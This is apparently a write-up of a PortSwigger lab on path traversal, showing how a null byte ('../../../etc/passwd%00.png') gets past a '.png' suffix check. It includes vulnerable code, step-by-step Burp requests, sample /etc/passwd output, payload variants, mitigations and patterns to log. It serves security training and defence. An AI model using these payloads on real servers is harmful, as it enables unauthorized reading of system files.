# 📘 PortSwigger Lab: File Path Traversal, Validation of File Extension with Null Byte Bypass

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass  
> 🎯 Topic: Path Traversal — bypassing file extension validation with a null byte  
> 🧪 Difficulty: Practitioner  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [📁 What Is Path Traversal](#path-traversal)
- [🧹 What "Validation of File Extension" Means](#extension-validation)
- [💀 What Is a Null Byte](#null-byte)
- [🔬 How the Working Payload Is Built](#payload-building)
- [🗂 How the Application Loads Images](#images)
- [❌ Vulnerable Validation Logic](#vulnerable-flow)
- [🔍 Step 1 — Find the Image Request](#step1)
- [🔍 Step 2 — Send the Request to Repeater](#step2)
- [🔍 Step 3 — Test Standard Traversal](#step3)
- [🔍 Step 4 — Test Traversal with Extension](#step4)
- [🔍 Step 5 — Add a Null Byte](#step5)
- [🔍 Step 6 — Read `/etc/passwd`](#step6)
- [📨 Example Original Request](#original-request)
- [📨 Example Modified Request](#modified-request)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧭 How `%00` Truncates the String](#truncation)
- [🐧 Why `/etc/passwd` Is Used](#passwd)
- [🧠 Pentester Mindset](#pentester)
- [🧪 Additional Tests](#additional-tests)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Exploit a **File Path Traversal** vulnerability in the product image display mechanism and retrieve the contents of:

```text
/etc/passwd
```

The application validates that the supplied filename **ends with the expected file extension**:

```text
.png
```

To bypass the validation, the following value is placed in the:

```text
filename
```

parameter:

```text
../../../etc/passwd%00.png
```

The extension check passes, and the null byte `%00` truncates the string when the file is read, leaving the effective path:

```text
../../../etc/passwd
```

---

<a id="theory"></a>

## 🧠 Short Theory

**Path Traversal** is a vulnerability that allows user input to influence the path of a file read by the server.

The application expects a normal image name:

```text
filename=58.png
```

The server builds a path such as:

```text
/var/www/images/58.png
```

The developer added a check:

```text
the filename must end with .png
```

This rejects the standard payload:

```text
../../../etc/passwd
```

However, in legacy backends (PHP before 5.3.4, C/C++ applications) strings are handled as C strings: their end is marked by a null byte `0x00`. If such a byte is placed inside the filename, the file function reads the path only up to it, ignoring everything after — including the validated `.png` extension.

---

<a id="idea"></a>

## 🧩 Core Idea

The standard payload:

```text
../../../etc/passwd
```

is blocked because it does not end with `.png`.

A payload with a real extension:

```text
../../../etc/passwd.png
```

also fails: the file `/etc/passwd.png` does not exist, and the path is interpreted literally.

The working approach adds a **null byte** before the extension:

```text
../../../etc/passwd%00.png
```

Processing flow:

```text
../../../etc/passwd%00.png
        ↓ URL-decoding
../../../etc/passwd\x00.png
        ↓ endswith(".png") check — the string ends with ".png"  ✅
        ↓ file function (C string) stops at \x00
../../../etc/passwd
```

Validation and execution see **different strings**: the check sees the suffix, the file system does not.

---

<a id="path-traversal"></a>

## 📁 What Is Path Traversal

Path Traversal is also known as:

```text
Directory Traversal
```

or:

```text
dot-dot-slash attack
```

The main sequence on Linux and Unix:

```text
../
```

means:

```text
move to the parent directory
```

Example starting directory:

```text
/var/www/images/
```

After one traversal:

```text
/var/www/
```

After two:

```text
/var/
```

After three:

```text
/
```

From the root, the attacker can reference:

```text
/etc/passwd
```

---

<a id="extension-validation"></a>

## 🧹 What "Validation of File Extension" Means

The application requires the supplied filename to end with the expected extension:

```text
.png
```

A simplified check:

```python
if not filename.endswith(".png"):
    return "Access denied"
```

This blocks:

```text
filename=../../../etc/passwd
```

because the string does not end with `.png`.

But the check only looks at the **suffix of the string**. It does not control what the file function actually reads, especially when the string contains a C-string terminator.

---

<a id="null-byte"></a>

## 💀 What Is a Null Byte

A null byte is a byte with the value:

```text
0x00
```

In URL encoding it is transmitted as:

```text
%00
```

In C strings, the null byte marks the **end of the string**. Every function that works with C strings (`fopen`, `stat`, `readfile`, `strlen`, etc.) reads up to the first `\x00` and ignores everything after it.

That is why the null byte is called a "string terminator".

---

<a id="payload-building"></a>

## 🔬 How the Working Payload Is Built

Take the classic traversal:

```text
../../../etc/passwd
```

Add a null byte:

```text
%00
```

Add the expected extension:

```text
.png
```

Result:

```text
../../../etc/passwd%00.png
```

Decoding and truncation:

```text
../../../etc/passwd%00.png
        ↓ %00 → \x00
../../../etc/passwd\x00.png
        ↓ C string: stop at \x00
../../../etc/passwd
```

The `endswith(".png")` check sees the full string and lets it through. The file function sees only `../../../etc/passwd`.

---

<a id="images"></a>

## 🗂 How the Application Loads Images

The lab contains a vulnerability in the product image display feature.

When a user opens a product page, the browser sends a separate request:

```http
GET /image?filename=58.png HTTP/2
Host: LAB-ID.web-security-academy.net
```

The parameter:

```text
filename
```

tells the server which file to read. Legitimate values end with `.png`.

---

<a id="vulnerable-flow"></a>

## ❌ Vulnerable Validation Logic

A simplified vulnerable implementation (legacy backend, PHP < 5.3.4):

```php
<?php
$filename = $_GET['filename'];
if (!preg_match('/\.png$/', $filename)) {
    die('Access denied');
}
$path = '/var/www/images/' . $filename;
readfile($path);   // truncates the string at \x00
?>
```

C-style equivalent:

```c
if (ends_with(filename, ".png")) {
    FILE *f = fopen(filename, "rb"); // fopen stops at '\0'
}
```

Vulnerable flow:

```text
User-controlled filename
        ↓
endswith(".png") — passes
        ↓
String passed to the file function
        ↓
String truncated at null byte (\x00)
        ↓
Effective path: ../../../etc/passwd
        ↓
Read /etc/passwd
```

---

<a id="step1"></a>

## 🔍 Step 1 — Find the Image Request

1. Open the lab.
2. Visit any product page.
3. Start Burp Suite.
4. Open:

```text
Proxy → HTTP history
```

5. Find the request that retrieves the product image:

```http
GET /image?filename=58.png HTTP/2
Host: LAB-ID.web-security-academy.net
```

The main test input is:

```text
filename=58.png
```

---

<a id="step2"></a>

## 🔍 Step 2 — Send the Request to Repeater

Right-click the request and select:

```text
Send to Repeater
```

Open the:

```text
Repeater
```

tab.

Burp Repeater allows you to:

- modify the `filename` value;
- resend the request;
- compare response status codes;
- analyze response lengths;
- inspect the response body.

---

<a id="step3"></a>

## 🔍 Step 3 — Test Standard Traversal

Replace the image name:

```text
58.png
```

with the standard payload:

```text
../../../etc/passwd
```

Request:

```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Expected result: rejection, because the value does not end with `.png`.

Conclusion: an extension check exists.

---

<a id="step4"></a>

## 🔍 Step 4 — Test Traversal with Extension

Try a payload with the extension appended:

```text
../../../etc/passwd.png
```

Request:

```http
GET /image?filename=../../../etc/passwd.png HTTP/2
Host: LAB-ID.web-security-academy.net
```

Expected result: a "file not found" error or an empty response, because `/etc/passwd.png` does not exist.

This confirms two facts:

```text
1. The extension check exists — without .png the request is rejected.
2. The path is interpreted literally — .png is not dropped by itself.
```

The next pentesting question:

```text
How does the backend handle the path string? Is there a string terminator (null byte)?
```

---

<a id="step5"></a>

## 🔍 Step 5 — Add a Null Byte

Replace the `filename` value with:

```text
../../../etc/passwd%00.png
```

Modified request:

```http
GET /image?filename=../../../etc/passwd%00.png HTTP/2
Host: LAB-ID.web-security-academy.net
```

Click:

```text
Send
```

Logic:

```text
../../../etc/passwd%00.png
        ↓ endswith(".png") — passes ✅
        ↓ %00 → \x00, C string truncated
../../../etc/passwd
```

---

<a id="step6"></a>

## 🔍 Step 6 — Read `/etc/passwd`

The HTTP response now contains text from the system file instead of image data:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

This confirms that the server read:

```text
/etc/passwd
```

The lab is then marked:

```text
Solved
```

---

<a id="original-request"></a>

## 📨 Example Original Request

```http
GET /image?filename=58.png HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION-VALUE
User-Agent: Mozilla/5.0
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
```

The client controls:

```text
58.png
```

---

<a id="modified-request"></a>

## 📨 Example Modified Request

```http
GET /image?filename=../../../etc/passwd%00.png HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION-VALUE
User-Agent: Mozilla/5.0
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
```

Critical payload:

```text
../../../etc/passwd%00.png
```

Important note for Burp Repeater: type the value exactly as shown. `%00` is a literal sequence of characters — Burp must not re-encode it or turn it into a real null byte.

---

<a id="response"></a>

## 📥 Example Result

The response may look similar to:

```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: ...
```

Response body:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
```

The exact contents depend on the lab environment.

The important proof is:

```text
the response contains data from /etc/passwd
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Open the PortSwigger lab
2. Visit a product page
3. Find the /image?filename=... request in Burp HTTP history
4. Send the request to Repeater
5. Confirm that plain ../../../etc/passwd is blocked
6. Confirm that ../../../etc/passwd.png does not find a file
7. Conclude: only the suffix of the string is checked
8. Assume a legacy backend with C strings (null byte)
9. Submit ../../../etc/passwd%00.png
10. Send the modified request
11. Receive the contents of /etc/passwd
12. Confirm that the lab is marked Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. The User Controls the Filename

The:

```text
filename
```

parameter is supplied by the client.

### 2. Only the Suffix of the String Is Checked

The `endswith(".png")` check does not analyze the path content before the extension.

### 3. The String Is Handled as a C String

The file function stops at the first null byte `\x00`.

### 4. `%00` Is Decoded into a Null Byte

The URL sequence `%00` becomes the byte `0x00`, which truncates the path.

### 5. Validation and Execution See Different Values

Validation sees `../../../etc/passwd%00.png`, the file system sees `../../../etc/passwd`.

### 6. The Final Path Is Not Validated

The application does not verify that the normalized path remains inside the image directory.

### 7. The Application Process Can Read the File

The web application has permission to read `/etc/passwd`, so its contents are returned.

---

<a id="truncation"></a>

## 🧭 How `%00` Truncates the String

Original payload:

```text
../../../etc/passwd%00.png
```

Step 1 — URL-decoding:

```text
../../../etc/passwd%00.png
        ↓ %00 → \x00
../../../etc/passwd\x00.png
```

Step 2 — C-string interpretation:

```text
../../../etc/passwd\x00.png
        ↓ read up to the first \x00
../../../etc/passwd
```

Step 3 — path normalization:

```text
../../../etc/passwd
        ↓ three levels up
/etc/passwd
```

The `.png` extension and everything after the null byte is simply ignored.

---

<a id="passwd"></a>

## 🐧 Why `/etc/passwd` Is Used

`/etc/passwd` is a standard Linux/Unix file.

It contains information about local user accounts.

Line format:

```text
username:x:UID:GID:comment:home:shell
```

Example:

```text
root:x:0:0:root:/root:/bin/bash
```

Field meanings:

```text
root        username
x           password is stored elsewhere
0           UID
0           GID
root        account description
/root       home directory
/bin/bash   login shell
```

Important distinction:

```text
/etc/passwd normally does not contain password hashes
```

Password hashes are stored in:

```text
/etc/shadow
```

which is restricted to privileged processes.

The lab uses `/etc/passwd` as a safe proof of arbitrary file read.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When the application validates a file extension, ask:

```text
Is only the suffix checked, or the whole path?
```

```text
What language and version is the backend? Is it vulnerable to null bytes?
```

```text
Are there other string terminator characters?
```

```text
Can the extension check be bypassed another way (e.g. double extension)?
```

Test sequence:

```text
1. Normal value: 58.png
2. Plain traversal: ../../../etc/passwd — blocked
3. Traversal + extension: ../../../etc/passwd.png — file not found
4. Null byte: ../../../etc/passwd%00.png — success (legacy backend)
5. Extension variations: %00.jpg, %00.gif
6. Compare response body, status and length
```

---

<a id="additional-tests"></a>

## 🧪 Additional Tests

Within an authorized lab, the following variants can be compared:

### Standard traversal (blocked)

```text
../../../etc/passwd
```

### Traversal with a real extension (file not found)

```text
../../../etc/passwd.png
```

### Null byte + .png (working for this lab)

```text
../../../etc/passwd%00.png
```

### Null byte + another extension

```text
../../../etc/passwd%00.jpg
```

### Null byte + absolute path

```text
/etc/passwd%00.png
```

### Double null byte

```text
../../../etc/passwd%00%00.png
```

The working value for this specific lab is:

```text
../../../etc/passwd%00.png
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Using Plain `../` Without an Extension

The payload:

```text
../../../etc/passwd
```

is blocked by the extension check.

### Mistake 2. Adding an Extension Without a Null Byte

The payload:

```text
../../../etc/passwd.png
```

does not find the file — the extension is taken literally.

### Mistake 3. Sending a Real Null Byte Instead of `%00`

The request must contain the textual sequence `%00`, not the actual `\x00` character.

### Mistake 4. Letting Burp Re-Encode `%00`

In Repeater the value must stay as-is. Verify the raw request line before sending.

### Mistake 5. Forgetting the Legacy Context

Null bytes only work in backends with C strings (PHP < 5.3.4, C/C++). Modern runtimes reject such paths.

### Mistake 6. Looking Only at the HTTP Status

Successful and unsuccessful requests may both return `200 OK`.

Inspect the response body.

### Mistake 7. Expecting JPEG Data

After exploitation, the server returns text from `/etc/passwd`, not an image.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Do Not Accept Paths from the User

Use an identifier:

```text
image_id=58
```

and map it server-side:

```python
allowed_images = {
    "58": "58.png",
    "59": "59.png",
}
```

### 2. Use an Allowlist

```python
if filename not in allowed_filenames:
    reject_request()
```

### 3. Use Modern Runtimes

Updated PHP (5.3.4+), patched JDK and other modern platforms reject null bytes in file paths by themselves.

### 4. Reject Control Characters

Block at the input layer:

```text
%00
\x00
```

and other control characters (`\x00`–`\x1F`).

### 5. Normalize and Validate the Final Path

```python
base = os.path.realpath("/var/www/images")
target = os.path.realpath(os.path.join(base, user_input))
if not target.startswith(base + os.sep):
    reject_request()
```

### 6. Use `basename` as an Additional Control

```python
filename = os.path.basename(user_input)
```

### 7. Apply Least Privilege

The web process should only be able to read the files it actually needs.

### 8. Log Suspicious Values

Examples:

```text
../
%00
..%2f
%2e%2e%2f
```

Logging helps detect attacks, but it does not replace correct validation.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Opened a product page
- [ ] Started Burp Proxy
- [ ] Located the image request
- [ ] Identified the `filename` parameter
- [ ] Sent the request to Repeater

### Validation Analysis

- [ ] Tested plain `../../../etc/passwd` — blocked
- [ ] Tested `../../../etc/passwd.png` — file not found
- [ ] Concluded that only the extension is checked
- [ ] Assumed a legacy backend with C strings

### Exploitation

- [ ] Used `../../../etc/passwd%00.png`
- [ ] Sent the request to the server
- [ ] Response contains lines from `/etc/passwd`
- [ ] Confirmed arbitrary file read
- [ ] Lab status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The application validated that the filename ends with:

```text
.png
```

However, it did not account for the fact that the underlying layer handles the string as a C string with a null terminator.

The payload:

```text
../../../etc/passwd%00.png
```

passed the extension check, and the null byte truncated the string to:

```text
../../../etc/passwd
```

This allowed the request to escape the image directory and retrieve:

```text
/etc/passwd
```

Main lessons:

```text
String validation and path interpretation are different layers and may see different values.
```

```text
Control characters (null byte) must be rejected at the input layer.
```

```text
Validation must run on the final canonical path.
```

```text
The normalized path must remain inside the approved base directory.
```

---

[⬆ Back to top](#top)
